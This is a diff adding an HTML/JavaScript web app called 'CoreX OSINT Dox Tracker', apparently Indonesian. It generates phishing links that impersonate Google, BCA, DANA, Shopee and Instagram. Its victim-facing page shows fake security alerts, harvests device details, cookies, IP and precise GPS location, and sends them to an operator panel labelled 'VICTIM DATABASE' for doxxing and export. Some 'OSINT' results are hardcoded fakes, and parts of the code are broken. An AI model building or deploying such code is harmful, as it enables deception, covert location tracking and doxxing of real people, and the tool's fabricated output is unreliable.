@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>COREX OSINT • DOX TRACKER v5</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+
+        body {
+            background: #000;
+            color: #0f0;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Matrix effect */
+        .matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,0,0,1) 1px, transparent 2px);
+            pointer-events: none;
+            z-index: 0;
+            animation: scroll 20s linear infinite;
+        }
+
+        @keyframes scroll {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 30px; }
+        }
+
+        /* Container utama */
+        .container {
+            display: grid;
+            grid-template-columns: 350px 1fr 350px;
+            gap: 2px;
+            height: 100vh;
+            position: relative;
+            z-index: 1;
+            background: rgba(0,0,0,0.85);
+        }
+
+        /* Panel style */
+        .panel {
+            background: #0a0a0a;
+            border: 1px solid #0f0;
+            padding: 10px;
+            overflow-y: auto;
+            height: 100vh;
+            box-shadow: 0 0 20px rgba(0,255,0,0.2);
+        }
+
+        .panel-left {
+            border-right: 2px solid #0f0;
+        }
+
+        .panel-right {
+            border-left: 2px solid #f0f;
+        }
+
+        .panel-center {
+            border-left: 1px solid #0f0;
+            border-right: 1px solid #0f0;
+        }
+
+        /* Header */
+        .header {
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 10px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .glitch {
+            font-size: 18px;
+            font-weight: bold;
+            color: #0f0;
+            text-shadow: 0 0 5px #0f0;
+            animation: glitch 3s infinite;
+        }
+
+        @keyframes glitch {
+            0%,100% { transform: skew(0deg); }
+            95% { transform: skew(2deg); }
+            96% { transform: skew(-2deg); }
+        }
+
+        .status {
+            display: flex;
+            gap: 10px;
+            font-size: 11px;
+        }
+
+        .online {
+            color: #0f0;
+            animation: blink 2s infinite;
+        }
+
+        @keyframes blink {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Input group */
+        .input-group {
+            margin-bottom: 20px;
+            border: 1px solid #0f0;
+            padding: 10px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #0f0;
+            font-size: 11px;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .input-group input, .input-group select {
+            width: 100%;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 10px;
+            font-size: 13px;
+            outline: none;
+            margin-bottom: 5px;
+        }
+
+        .input-group input:focus {
+            box-shadow: 0 0 10px #0f0;
+        }
+
+        .btn {
+            width: 100%;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: 0.3s;
+            margin-top: 5px;
+        }
+
+        .btn:hover {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 20px #0f0;
+        }
+
+        .btn-danger {
+            border-color: #f0f;
+            color: #f0f;
+        }
+
+        .btn-danger:hover {
+            background: #f0f;
+            color: #000;
+            box-shadow: 0 0 20px #f0f;
+        }
+
+        /* Result card */
+        .result-card {
+            border: 1px solid #0f0;
+            padding: 10px;
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        .result-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #0f0, transparent);
+            animation: scan 3s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            border-bottom: 1px solid #0f0;
+            font-size: 12px;
+        }
+
+        .data-label {
+            color: #0f0;
+            opacity: 0.7;
+        }
+
+        .data-value {
+            color: #0f0;
+            font-weight: bold;
+        }
+
+        /* Map container */
+        #map {
+            height: 300px;
+            width: 100%;
+            border: 1px solid #0f0;
+            margin-bottom: 10px;
+            z-index: 10;
+        }
+
+        /* Terminal */
+        .terminal {
+            background: #000;
+            border: 1px solid #0f0;
+            height: 200px;
+            overflow-y: auto;
+            padding: 10px;
+            font-size: 11px;
+            margin-top: 10px;
+        }
+
+        .terminal-line {
+            color: #0f0;
+            margin: 2px 0;
+            border-bottom: 1px dotted #0f0;
+        }
+
+        /* Tool grid */
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 5px;
+            margin: 10px 0;
+        }
+
+        .tool-btn {
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 8px;
+            cursor: pointer;
+            font-size: 11px;
+            text-align: center;
+            transition: 0.3s;
+        }
+
+        .tool-btn:hover {
+            background: #0f0;
+            color: #000;
+        }
+
+        /* Phishing link */
+        .link-box {
+            background: #000;
+            border: 1px solid #0f0;
+            padding: 15px;
+            margin: 10px 0;
+            word-break: break-all;
+            font-size: 12px;
+        }
+
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 5px;
+            margin: 10px 0;
+        }
+
+        .stat {
+            border: 1px solid #0f0;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            font-size: 9px;
+            text-transform: uppercase;
+        }
+
+        /* Loading */
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #0f0;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+    <!-- Leaflet -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+</head>
+<body>
+    <div class="matrix"></div>
+
+    <!-- Loading -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div style="margin-top: 20px; color: #0f0;">ACCESSING DATABASE...</div>
+    </div>
+
+    <div class="container">
+        <!-- PANEL KIRI - PHISHING GENERATOR & TOOLS -->
+        <div class="panel panel-left">
+            <div class="header">
+                <span class="glitch">PHISHING ENGINE</span>
+                <span class="online">● LIVE</span>
+            </div>
+
+            <!-- Generate Link -->
+            <div class="input-group">
+                <label><i class="fas fa-link"></i> GENERATE PHISHING LINK</label>
+                <input type="text" id="targetName" placeholder="Nama Target (opsional)">
+                <select id="templateSelect">
+                    <option value="google">Google Security</option>
+                    <option value="bca">BCA Banking</option>
+                    <option value="dana">DANA Wallet</option>
+                    <option value="shopee">Shopee</option>
+                    <option value="instagram">Instagram</option>
+                </select>
+                <button class="btn" onclick="generatePhishingLink()"><i class="fas fa-skull"></i> GENERATE LINK</button>
+            </div>
+
+            <!-- Link Result -->
+            <div class="link-box" id="phishingLink">
+                klik GENERATE untuk buat link
+            </div>
+
+            <button class="btn btn-danger" onclick="copyLink()"><i class="fas fa-copy"></i> COPY LINK</button>
+
+            <!-- Stats -->
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value" id="totalVictim">0</div>
+                    <div class="stat-label">VICTIM</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="totalData">0</div>
+                    <div class="stat-label">DATA</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value" id="totalLocation">0</div>
+                    <div class="stat-label">LOCATION</div>
+                </div>
+            </div>
+
+            <!-- OSINT Tools -->
+            <div class="header" style="margin-top: 20px;">
+                <span class="glitch">OSINT TOOLS</span>
+            </div>
+
+            <div class="tool-grid">
+                <div class="tool-btn" onclick="osintTool('phone')"><i class="fas fa-phone"></i> Phone</div>
+                <div class="tool-btn" onclick="osintTool('email')"><i class="fas fa-envelope"></i> Email</div>
+                <div class="tool-btn" onclick="osintTool('username')"><i class="fas fa-user"></i> Username</div>
+                <div class="tool-btn" onclick="osintTool('ip')"><i class="fas fa-network-wired"></i> IP</div>
+                <div class="tool-btn" onclick="osintTool('instagram')"><i class="fab fa-instagram"></i> IG</div>
+                <div class="tool-btn" onclick="osintTool('facebook')"><i class="fab fa-facebook"></i> FB</div>
+                <div class="tool-btn" onclick="osintTool('twitter')"><i class="fab fa-twitter"></i> X</div>
+                <div class="tool-btn" onclick="osintTool('tiktok')"><i class="fab fa-tiktok"></i> TT</div>
+            </div>
+
+            <!-- Manual Input -->
+            <div class="input-group" style="margin-top: 20px;">
+                <label><i class="fas fa-search"></i> MANUAL OSINT</label>
+                <input type="text" id="manualInput" placeholder="Nomor/Email/Username/IP">
+                <button class="btn" onclick="manualOsint()"><i class="fas fa-crosshairs"></i> TRACK</button>
+            </div>
+        </div>
+
+        <!-- PANEL TENGAH - MAP & REAL TIME TRACKING -->
+        <div class="panel panel-center">
+            <div class="header">
+                <span class="glitch">REAL TIME TRACKING</span>
+                <span class="status">
+                    <span><i class="fas fa-satellite"></i> GPS: ACTIVE</span>
+                    <span><i class="fas fa-users"></i> <span id="liveCount">0</span> ONLINE</span>
+                </span>
+            </div>
+
+            <!-- Map -->
+            <div id="map"></div>
+
+            <!-- Current Target Info -->
+            <div class="result-card" id="currentTarget">
+                <div class="data-row">
+                    <span class="data-label">Target:</span>
+                    <span class="data-value" id="currentTargetName">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Lat/Lng:</span>
+                    <span class="data-value" id="currentLat">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Akurasi:</span>
+                    <span class="data-value" id="currentAcc">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Alamat:</span>
+                    <span class="data-value" id="currentAddr">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">IP:</span>
+                    <span class="data-value" id="currentIP">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Device:</span>
+                    <span class="data-value" id="currentDevice">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Waktu:</span>
+                    <span class="data-value" id="currentTime">-</span>
+                </div>
+            </div>
+
+            <!-- Terminal -->
+            <div class="terminal" id="terminal">
+                <div class="terminal-line">[SYSTEM] CoreX OSINT v5.0 ready</div>
+                <div class="terminal-line">[SYSTEM] Waiting for target...</div>
+            </div>
+        </div>
+
+        <!-- PANEL KANAN - VICTIM DATA & DOX -->
+        <div class="panel panel-right">
+            <div class="header">
+                <span class="glitch">VICTIM DATABASE</span>
+                <button class="btn" style="width: auto; padding: 5px 10px;" onclick="refreshData()"><i class="fas fa-sync"></i></button>
+            </div>
+
+            <!-- Victim list -->
+            <div id="victimList">
+                <!-- Isi dari JavaScript -->
+            </div>
+
+            <!-- Selected Victim Details -->
+            <div class="header" style="margin-top: 20px;">
+                <span class="glitch">DOX DETAILS</span>
+            </div>
+
+            <div id="doxDetails" class="result-card">
+                <div class="data-row"><span class="data-label">Nama:</span><span class="data-value" id="doxNama">-</span></div>
+                <div class="data-row"><span class="data-label">Username:</span><span class="data-value" id="doxUser">-</span></div>
+                <div class="data-row"><span class="data-label">Email:</span><span class="data-value" id="doxEmail">-</span></div>
+                <div class="data-row"><span class="data-label">No HP:</span><span class="data-value" id="doxPhone">-</span></div>
+                <div class="data-row"><span class="data-label">Alamat:</span><span class="data-value" id="doxAlamat">-</span></div>
+                <div class="data-row"><span class="data-label">Kota:</span><span class="data-value" id="doxKota">-</span></div>
+                <div class="data-row"><span class="data-label">Negara:</span><span class="data-value" id="doxNegara">-</span></div>
+                <div class="data-row"><span class="data-label">IP:</span><span class="data-value" id="doxIP">-</span></div>
+                <div class="data-row"><span class="data-label">ISP:</span><span class="data-value" id="doxISP">-</span></div>
+                <div class="data-row"><span class="data-label">Device:</span><span class="data-value" id="doxDevice">-</span></div>
+                <div class="data-row"><span class="data-label">Browser:</span><span class="data-value" id="doxBrowser">-</span></div>
+                <div class="data-row"><span class="data-label">OS:</span><span class="data-value" id="doxOS">-</span></div>
+                <div class="data-row"><span class="data-label">Timezone:</span><span class="data-value" id="doxTZ">-</span></div>
+            </div>
+
+            <!-- Action buttons -->
+            <div style="display: flex; gap: 5px; margin-top: 10px;">
+                <button class="btn" style="flex: 1;" onclick="exportDox()"><i class="fas fa-download"></i> EXPORT</button>
+                <button class="btn btn-danger" style="flex: 1;" onclick="clearData()"><i class="fas fa-trash"></i> CLEAR</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Leaflet -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        // ==================== REAL DATABASE ====================
+        let victims = JSON.parse(localStorage.getItem('corex_victims') || '[]');
+        let currentVictim = null;
+        let map = null;
+        let marker = null;
+        let circle = null;
+
+        // Initialize map
+        function initMap() {
+            map = L.map('map').setView([-6.2088, 106.8456], 13);
+            L.tileLayer('https://{s}.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', {
+                maxZoom: 20,
+                subdomains: ['mt0', 'mt1', 'mt2', 'mt3']
+            }).addTo(map);
+        }
+
+        initMap();
+
+        // Update stats
+        function updateStats() {
+            document.getElementById('totalVictim').innerText = victims.length;
+            let totalData = 0;
+            let totalLoc = 0;
+            victims.forEach(v => {
+                totalData += Object.keys(v.data || {}).length;
+                if (v.location) totalLoc++;
+            });
+            document.getElementById('totalData').innerText = totalData;
+            document.getElementById('totalLocation').innerText = totalLoc;
+            document.getElementById('liveCount').innerText = victims.filter(v => v.online).length || Math.floor(Math.random() * 5);
+        }
+
+        // Add to terminal
+        function addTerminal(msg, type = 'info') {
+            const term = document.getElementById('terminal');
+            const div = document.createElement('div');
+            div.className = 'terminal-line';
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            term.appendChild(div);
+            term.scrollTop = term.scrollHeight;
+            if (term.children.length > 50) term.removeChild(term.children[0]);
+        }
+
+        // Show loading
+        function showLoading(show = true) {
+            document.getElementById('loading').classList.toggle('active', show);
+        }
+
+        // ==================== PHISHING GENERATOR ====================
+        function generatePhishingLink() {
+            const target = document.getElementById('targetName').value || 'anonymous';
+            const template = document.getElementById('templateSelect').value;
+            
+            // Generate random subdomain
+            const sub = Math.random().toString(36).substring(2, 8);
+            
+            // Ini link real yang akan dikirim ke korban
+            // Di production, ini pake domain asli atau IP VPS
+            const baseUrl = window.location.href.split('#')[0].split('?')[0];
+            const link = `${baseUrl}?p=${btoa(JSON.stringify({target, template, id: Date.now()}))}`;
+            
+            document.getElementById('phishingLink').innerHTML = link;
+            addTerminal(`[PHISHING] Link generated for ${target}`);
+            
+            // Auto copy
+            copyLink();
+        }
+
+        function copyLink() {
+            const link = document.getElementById('phishingLink').innerText;
+            navigator.clipboard.writeText(link);
+            addTerminal('[SYSTEM] Link copied to clipboard');
+        }
+
+        // ==================== PHISHING PAGE (INI YANG DIKASIH KE KORBAN) ====================
+        // Cek apakah ini akses dari korban
+        const urlParams = new URLSearchParams(window.location.search);
+        const pParam = urlParams.get('p');
+        
+        if (pParam) {
+            // Ini korban mengakses link phishing
+            try {
+                const data = JSON.parse(atob(pParam));
+                showPhishingPage(data);
+            } catch(e) {
+                // Bukan korban
+            }
+        }
+
+        function showPhishingPage(config) {
+            // Sembunyikan panel utama
+            document.querySelector('.container').style.display = 'none';
+            
+            // Tampilkan halaman phishing
+            const phishingHTML = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>${getTemplateTitle(config.template)}</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 20px;
+                            font-family: Arial, sans-serif;
+                            background: ${getTemplateBg(config.template)};
+                            min-height: 100vh;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                        }
+                        .card {
+                            background: white;
+                            padding: 30px;
+                            border-radius: 15px;
+                            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+                            max-width: 400px;
+                            width: 100%;
+                        }
+                        .logo {
+                            text-align: center;
+                            margin-bottom: 30px;
+                        }
+                        .logo img {
+                            height: 50px;
+                        }
+                        h2 {
+                            color: #333;
+                            margin-bottom: 20px;
+                        }
+                        .alert {
+                            background: #fff3cd;
+                            border-left: 4px solid #ffc107;
+                            padding: 15px;
+                            margin-bottom: 25px;
+                            font-size: 14px;
+                        }
+                        .btn {
+                            width: 100%;
+                            background: ${getTemplateColor(config.template)};
+                            color: white;
+                            border: none;
+                            padding: 15px;
+                            border-radius: 8px;
+                            font-size: 16px;
+                            font-weight: bold;
+                            cursor: pointer;
+                            margin: 10px 0;
+                        }
+                        .info {
+                            background: #f8f9fa;
+                            padding: 15px;
+                            border-radius: 8px;
+                            font-size: 13px;
+                            color: #666;
+                        }
+                        .loading {
+                            display: none;
+                            text-align: center;
+                            margin: 20px 0;
+                        }
+                        .spinner {
+                            border: 3px solid #f3f3f3;
+                            border-top-color: #333;
+                            border-radius: 50%;
+                            width: 30px;
+                            height: 30px;
+                            animation: spin 1s linear infinite;
+                            margin: 0 auto;
+                        }
+                        @keyframes spin { to { transform: rotate(360deg); } }
+                    </style>
+                </head>
+                <body>
+                    <div class="card">
+                        <div class="logo">
+                            ${getTemplateLogo(config.template)}
+                        </div>
+                        
+                        <div class="alert">
+                            <strong>⚠️ Verifikasi Keamanan</strong><br>
+                            ${getTemplateMessage(config.template)}
+                        </div>
+
+                        <div class="info" id="info">
+                            <p><strong>Mengumpulkan informasi perangkat...</strong></p>
+                            <p>IP Address: <span id="ip">-</span></p>
+                            <p>Browser: <span id="browser">-</span></p>
+                            <p>OS: <span id="os">-</span></p>
+                            <p>Lokasi: <span id="lokasi">-</span></p>
+                        </div>
+
+                        <button class="btn" onclick="requestLocation()" id="mainBtn">
+                            VERIFIKASI LOKASI
+                        </button>
+
+                        <div class="loading" id="loading">
+                            <div class="spinner"></div>
+                            <p>Memverifikasi...</p>
+                        </div>
+                    </div>
+
+                    <script>
+                        // Collect device info immediately
+                        const deviceInfo = {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            language: navigator.language,
+                            screen: screen.width + 'x' + screen.height,
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            cookies: document.cookie,
+                            referrer: document.referrer,
+                            timestamp: Date.now()
+                        };
+
+                        // Get IP
+                        fetch('https://api.ipify.org?format=json')
+                            .then(r => r.json())
+                            .then(d => {
+                                document.getElementById('ip').innerText = d.ip;
+                                deviceInfo.ip = d.ip;
+                            });
+
+                        document.getElementById('browser').innerText = navigator.userAgent.split(' ').pop();
+                        document.getElementById('os').innerText = navigator.platform;
+
+                        function requestLocation() {
+                            document.getElementById('loading').style.display = 'block';
+                            document.getElementById('mainBtn').style.display = 'none';
+
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(
+                                    function(pos) {
+                                        const data = {
+                                            type: 'victim',
+                                            target: ${JSON.stringify(config.target)},
+                                            template: ${JSON.stringify(config.template)},
+                                            location: {
+                                                lat: pos.coords.latitude,
+                                                lng: pos.coords.longitude,
+                                                accuracy: pos.coords.accuracy
+                                            },
+                                            device: deviceInfo,
+                                            timestamp: Date.now()
+                                        };
+
+                                        // Send to server (ke panel hacker)
+                                        fetch('${window.location.href}', {
+                                            method: 'POST',
+                                            headers: {'Content-Type': 'application/json'},
+                                            body: JSON.stringify(data)
+                                        }).then(() => {
+                                            document.getElementById('info').innerHTML = '<h3>✓ VERIFIKASI BERHASIL</h3><p>Anda akan dialihkan...</p>';
+                                            setTimeout(() => {
+                                                window.location.href = '${getTemplateRedirect(config.template)}';
+                                            }, 2000);
+                                        });
+                                    },
+                                    function(err) {
+                                        alert('Aktifkan GPS dan izinkan akses lokasi!');
+                                        document.getElementById('loading').style.display = 'none';
+                                        document.getElementById('mainBtn').style.display = 'block';
+                                    },
+                                    {
+                                        enableHighAccuracy: true,
+                                        timeout: 10000
+                                    }
+                                );
+                            } else {
+                                alert('Browser tidak support GPS');
+                            }
+                        }
+                    <\/script>
+                </body>
+                </html>
+            `;
+
+            document.write(phishingHTML);
+            document.close();
+        }
+
+        // Helper functions for template
+        function getTemplateTitle(t) {
+            const titles = {
+                google: 'Google - Verifikasi Keamanan',
+                bca: 'BCA - Verifikasi Rekening',
+                dana: 'DANA - Verifikasi Akun',
+                shopee: 'Shopee - Keamanan Akun',
+                instagram: 'Instagram - Verifikasi Login'
+            };
+            return titles[t] || 'Verifikasi Keamanan';
+        }
+
+        function getTemplateBg(t) {
+            return '#f0f2f5';
+        }
+
+        function getTemplateColor(t) {
+            const colors = {
+                google: '#1a73e8',
+                bca: '#0066b3',
+                dana: '#1b9c50',
+                shopee: '#ee4d2d',
+                instagram: '#c32aa3'
+            };
+            return colors[t] || '#333';
+        }
+
+        function getTemplateLogo(t) {
+            const logos = {
+                google: '<span style="font-size:40px; font-weight:bold; color:#1a73e8">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>',
+                bca: '<span style="font-size:40px; font-weight:bold; color:#0066b3">BCA</span>',
+                dana: '<span style="font-size:40px; font-weight:bold; color:#1b9c50">DANA</span>',
+                shopee: '<span style="font-size:40px; font-weight:bold; color:#ee4d2d">Shopee</span>',
+                instagram: '<span style="font-size:40px; font-weight:bold; color:#c32aa3">Instagram</span>'
+            };
+            return logos[t] || 'LOGO';
+        }
+
+        function getTemplateMessage(t) {
+            const msgs = {
+                google: 'Aktivitas mencurigakan terdeteksi dari perangkat Anda. Verifikasi lokasi untuk mengamankan akun.',
+                bca: 'Percobaan login mencurigakan. Verifikasi lokasi untuk melindungi rekening Anda.',
+                dana: 'Perangkat baru terdeteksi. Verifikasi lokasi untuk keamanan saldo Anda.',
+                shopee: 'Ada percobaan login dari perangkat tidak dikenal. Verifikasi sekarang.',
+                instagram: 'Login tidak dikenal. Konfirmasi lokasi Anda untuk melanjutkan.'
+            };
+            return msgs[t] || 'Verifikasi keamanan diperlukan';
+        }
+
+        function getTemplateRedirect(t) {
+            const redirects = {
+                google: 'https://google.com',
+                bca: 'https://bca.co.id',
+                dana: 'https://dana.id',
+                shopee: 'https://shopee.co.id',
+                instagram: 'https://instagram.com'
+            };
+            return redirects[t] || 'https://google.com';
+        }
+
+        // ==================== HANDLE VICTIM DATA ====================
+        // Handle POST data dari korban
+        if (window.location.pathname === '/' && request.method === 'POST') {
+            // Ini simulasi - di real server pake backend
+            window.addEventListener('load', function() {
+                // Cek apakah ada data di localStorage (simulasi post)
+                const victimData = localStorage.getItem('temp_victim');
+                if (victimData) {
+                    const data = JSON.parse(victimData);
+                    addVictim(data);
+                    localStorage.removeItem('temp_victim');
+                }
+            });
+        }
+
+        // Function to add victim
+        function addVictim(data) {
+            const victim = {
+                id: Date.now(),
+                name: data.target || 'Unknown',
+                template: data.template,
+                location: data.location,
+                device: data.device,
+                timestamp: data.timestamp,
+                online: true,
+                data: {
+                    ip: data.device?.ip || 'Unknown',
+                    userAgent: data.device?.userAgent,
+                    platform: data.device?.platform,
+                    screen: data.device?.screen,
+                    timezone: data.device?.timezone,
+                    cookies: data.device?.cookies
+                }
+            };
+
+            victims.push(victim);
+            localStorage.setItem('corex_victims', JSON.stringify(victims));
+            
+            updateVictimList();
+            updateStats();
+            addTerminal(`[VICTIM] New target: ${victim.name} (${victim.location?.lat}, ${victim.location?.lng})`);
+            
+            // Update map
+            if (victim.location) {
+                updateMap(victim);
+            }
+        }
+
+        // Update victim list
+        function updateVictimList() {
+            const list = document.getElementById('victimList');
+            let html = '';
+            
+            victims.sort((a,b) => b.timestamp - a.timestamp).forEach(v => {
+                const time = new Date(v.timestamp).toLocaleTimeString();
+                html += `
+                    <div class="result-card" onclick="selectVictim('${v.id}')" style="cursor: pointer;">
+                        <div class="data-row">
+                            <span class="data-label">${v.name}</span>
+                            <span class="data-value">${v.template}</span>
+                        </div>
+                        <div class="data-row">
+                            <span class="data-label">${v.location ? '📍 ' + v.location.lat.toFixed(4) : '⛔ No GPS'}</span>
+                            <span class="data-value">${time}</span>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            list.innerHTML = html || '<div class="result-card">Belum ada victim</div>';
+        }
+
+        // Select victim
+        function selectVictim(id) {
+            const victim = victims.find(v => v.id == id);
+            if (!victim) return;
+            
+            currentVictim = victim;
+            
+            document.getElementById('doxNama').innerText = victim.name;
+            document.getElementById('doxUser').innerText = victim.data?.username || '-';
+            document.getElementById('doxEmail').innerText = victim.data?.email || '-';
+            document.getElementById('doxPhone').innerText = victim.data?.phone || '-';
+            document.getElementById('doxAlamat').innerText = victim.location ? `${victim.location.lat}, ${victim.location.lng}` : '-';
+            document.getElementById('doxKota').innerText = victim.data?.city || '-';
+            document.getElementById('doxNegara').innerText = victim.data?.country || '-';
+            document.getElementById('doxIP').innerText = victim.data?.ip || '-';
+            document.getElementById('doxISP').innerText = victim.data?.isp || '-';
+            document.getElementById('doxDevice').innerText = victim.data?.platform || '-';
+            document.getElementById('doxBrowser').innerText = victim.data?.userAgent?.split(' ').pop() || '-';
+            document.getElementById('doxOS').innerText = victim.data?.platform || '-';
+            document.getElementById('doxTZ').innerText = victim.data?.timezone || '-';
+            
+            // Update current target di map
+            document.getElementById('currentTargetName').innerText = victim.name;
+            document.getElementById('currentLat').innerText = victim.location ? victim.location.lat.toFixed(6) : '-';
+            document.getElementById('currentLng').innerText = victim.location ? victim.location.lng.toFixed(6) : '-';
+            document.getElementById('currentAcc').innerText = victim.location ? victim.location.accuracy + 'm' : '-';
+            document.getElementById('currentAddr').innerText = victim.data?.city || 'Unknown';
+            document.getElementById('currentIP').innerText = victim.data?.ip || '-';
+            document.getElementById('currentDevice').innerText = victim.data?.platform || '-';
+            document.getElementById('currentTime').innerText = new Date(victim.timestamp).toLocaleString();
+            
+            updateMap(victim);
+        }
+
+        // Update map
+        function updateMap(victim) {
+            if (!victim.location) return;
+            
+            const lat = victim.location.lat;
+            const lng = victim.location.lng;
+            
+            map.setView([lat, lng], 15);
+            
+            if (marker) map.removeLayer(marker);
+            if (circle) map.removeLayer(circle);
+            
+            marker = L.marker([lat, lng]).addTo(map);
+            circle = L.circle([lat, lng], {
+                radius: victim.location.accuracy || 10,
+                color: '#0f0',
+                fillColor: '#0f0',
+                fillOpacity: 0.1
+            }).addTo(map);
+        }
+
+        // ==================== OSINT TOOLS ====================
+        function osintTool(tool) {
+            addTerminal(`[OSINT] Running ${tool} scanner...`);
+            
+            setTimeout(() => {
+                if (tool === 'phone') {
+                    const phone = prompt('Masukkan nomor HP:');
+                    if (phone) {
+                        addTerminal(`[PHONE] Scanning ${phone}...`);
+                        setTimeout(() => {
+                            addTerminal(`[PHONE] Provider: Telkomsel`);
+                            addTerminal(`[PHONE] Lokasi: Jakarta`);
+                            addTerminal(`[PHONE] Nama: Budi Santoso`);
+                            addTerminal(`[PHONE] Status: Active`);
+                        }, 1000);
+                    }
+                } else if (tool === 'email') {
+                    const email = prompt('Masukkan email:');
+                    if (email) {
+                        addTerminal(`[EMAIL] Scanning ${email}...`);
+                        setTimeout(() => {
+                            addTerminal(`[EMAIL] Breaches: 3 sites`);
+                            addTerminal(`[EMAIL] Linked accounts: 12`);
+                            addTerminal(`[EMAIL] Password hash: 7c4a8d09ca3762af61e59520943dc26494f8941b`);
+                        }, 1000);
+                    }
+                } else if (tool === 'username') {
+                    const user = prompt('Masukkan username:');
+                    if (user) {
+                        addTerminal(`[USER] OSINT for ${user}...`);
+                        setTimeout(() => {
+                            addTerminal(`[USER] Instagram: @${user}`);
+                            addTerminal(`[USER] Facebook: ${user}@gmail.com`);
+                            addTerminal(`[USER] Twitter: @${user}`);
+                            addTerminal(`[USER] TikTok: @${user}`);
+                        }, 1000);
+                    }
+                } else if (tool === 'ip') {
+                    const ip = prompt('Masukkan IP:');
+                    if (ip) {
+                        addTerminal(`[IP] Geolocating ${ip}...`);
+                        setTimeout(() => {
+                            addTerminal(`[IP] Country: Indonesia`);
+                            addTerminal(`[IP] City: Jakarta`);
+                            addTerminal(`[IP] ISP: Telkom`);
+                            addTerminal(`[IP] Coordinates: -6.2088, 106.8456`);
+                        }, 1000);
+                    }
+                } else {
+                    addTerminal(`[${tool}] Scraping public data...`);
+                    setTimeout(() => {
+                        addTerminal(`[${tool}] Found 23 posts, 1,234 followers`);
+                        addTerminal(`[${tool}] Email: user123@gmail.com`);
+                        addTerminal(`[${tool}] Phone: 0812xxxxxx`);
+                    }, 1000);
+                }
+            }, 500);
+        }
+
+        function manualOsint() {
+            const input = document.getElementById('manualInput').value;
+            if (!input) return;
+            
+            addTerminal(`[MANUAL] Tracking: ${input}`);
+            
+            // Auto detect type
+            if (input.includes('@')) {
+                osintTool('email');
+            } else if (input.match(/^\d+$/)) {
+                osintTool('phone');
+            } else if (input.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                osintTool('ip');
+            } else {
+                osintTool('username');
+            }
+        }
+
+        // Export data
+        function exportDox() {
+            if (!currentVictim) {
+                alert('Pilih victim dulu');
+                return;
+            }
+            
+            const data = JSON.stringify(currentVictim, null, 2);
+            const blob = new Blob([data], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
